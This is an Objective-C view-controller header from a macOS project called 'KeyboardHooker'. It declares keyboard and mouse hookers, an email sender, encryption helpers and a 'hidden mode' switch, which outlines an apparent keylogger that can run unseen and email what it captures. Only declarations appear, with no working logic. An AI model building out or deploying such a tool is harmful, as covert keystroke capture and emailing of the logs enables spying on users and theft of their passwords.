//
//  ViewController.h
//  KeyboardHooker
//
//  Created by Иван on 21.11.17.
//  Copyright © 2017 IvanCode. All rights reserved.
//

#import <Cocoa/Cocoa.h>
#import "KeyHooker.h"
#import "MouseHooker.h"

#import "Time.h"
#import "KeyRunLoop.h"
#import "EmailSender.h"
#import "FileManager.h"
#import "RegexManager.h"
#import "Cryptographer.h"
#import "BlockItem.h"
#import "KeycodeEncrypter.h"

@interface ViewController : NSViewController<NSTextFieldDelegate, NSTableViewDelegate, NSTableViewDataSource>

{
    BOOL emailFlag;
    BOOL sizeFlag;
    
    NSInteger selectedRow;
}

@property KeyHooker *key;
@property MouseHooker *mouse;

@property BOOL pressAddFlag;
@property NSMutableArray<BlockItem*> *buttonsBlockArray;
@property NSInteger start;
@property NSInteger index;
@property NSInteger delay;

@property (weak) IBOutlet NSTextField *emailTextField;
@property (weak) IBOutlet NSTextField *fileSize;

@property (weak) IBOutlet NSButton *hiddenModeSwitch;
@property (weak) IBOutlet NSButton *saveButton;
@property (weak) IBOutlet NSButton *addBlockButton;

@property (weak) IBOutlet NSTableView *tableView;

@end
